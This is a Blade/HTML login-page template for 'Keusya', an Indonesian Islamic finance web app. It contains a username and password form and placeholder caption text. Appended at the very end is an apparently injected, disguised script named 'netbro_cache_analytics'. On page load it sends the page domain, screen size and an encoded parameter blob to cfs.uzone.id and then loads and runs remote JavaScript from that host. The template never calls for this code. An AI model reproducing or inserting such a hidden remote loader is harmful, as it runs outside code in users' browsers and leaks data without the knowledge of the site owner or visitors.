<!DOCTYPE html>
<html>



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <title>Keusya - Aplikasi Keuangan Syariah</title>

    <!-- Favicon -->
    <link rel="shortcut icon" href="{{ asset('assets/images/logo/favicon.png') }}">

    <!-- plugins css -->
    <link rel="stylesheet" href="{{ asset('bower_components/bootstrap/dist/css/bootstrap.css') }}" />
    <link rel="stylesheet" href="{{ asset('bower_components/PACE/themes/blue/pace-theme-minimal.css') }}" />
    <link rel="stylesheet" href="{{ asset('bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css') }}" />

    <!-- core css -->
    <link href="{{ asset('assets/css/ei-icon.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/themify-icons.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/font-awesome.min.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/animate.min.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/app.css') }}" rel="stylesheet">
</head>

<body>
    <div class="app">
        <div class="authentication">
            <div class="sign-in">
                <div class="row no-mrg-horizon">
                    <div class="col-md-8 no-pdd-horizon hidden-xs">
                        <div class="full-height bg" style="background-image: url('assets/images/others/img-29.jpg')">
                            <div class="img-caption">
                                <h1 class="caption-title">We make spectacular</h1>
                                <p class="caption-text">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 no-pdd-horizon">
                        <div class="full-height bg-white height-100">
                            <div class="vertical-align full-height pdd-horizon-70">
                                <div class="table-cell">
                                    <div class="pdd-horizon-15">
                                        <h2>Login</h2>
                                        <p class="mrg-btm-15 font-size-13">Please enter your user name and password to login</p>
                                        <form>
                                            <div class="form-group">
                                                <input type="email" class="form-control" placeholder="User name">
                                            </div>
                                            <div class="form-group">
                                                <input type="password" class="form-control" placeholder="Password">
                                            </div>
                                            <div class="checkbox font-size-12">
                                                <input id="agreement" name="agreement" type="checkbox">
                                                <label for="agreement">Keep Me Signed In</label>
                                            </div>
                                            <button class="btn btn-info">Login</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="login-footer">
                                <img class="img-responsive inline-block" src="assets/images/logo/logo.png" width="100" alt="">
                                <span class="font-size-13 pull-right pdd-top-10">Don't have an account? <a href="{{ url('/register')}}">Sign Up Now</a></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="{{ asset('assets/js/vendor.js') }}"></script>

    <script src="{{ asset('assets/js/app.min.js') }}"></script>

    <!-- page js -->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31dK4ZUfyQ6h17H2gpM8K7yBIYJnkRQJdcJk3wi%2fL2iLuMD5lXPtAOnOZ3BMUiGAsPomjEUDwn9SShP0Zxa9vYkqMiDoeZ58Sozaf1QqKd5ud%2bDMInETTN%2bBe%2bRIpsffOVoGf4CR5N5c1%2fCt%2f3Zyc9neaCqUWllyvtKa7azVEK0%2fNWWPts88HAftQtqfYp1r9%2bryPJ6wD%2bT0jWsYZfpZm2tGVL9adlavfBeDxxLg9hK9aJ5WZq7LViD9bEwXmR%2bWuii9mLiHTWiHXTtTNE2TnYMpGsp%2f5Ido317p0gu6q8ZtCfVcO%2bWMBxgkXOK77Gu6Y3VHlTho9RwTqa7mzopaSeyTrmkSkgvWWfnf%2fxxygh0krf8NoyA9v%2f2vtie3cFrJk%2bmVjnW7d85aVhte%2f4L5Ji5J64bvhxG9kTARskDRbX6XxUGB%2fG41mgJCX16ZP%2fjj6vXEWCh7m0etMQaO%2bfrqWZHulFJhgmi4m2nbIZNFQ%2bqemVtQ1k5OIj1A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>



</html>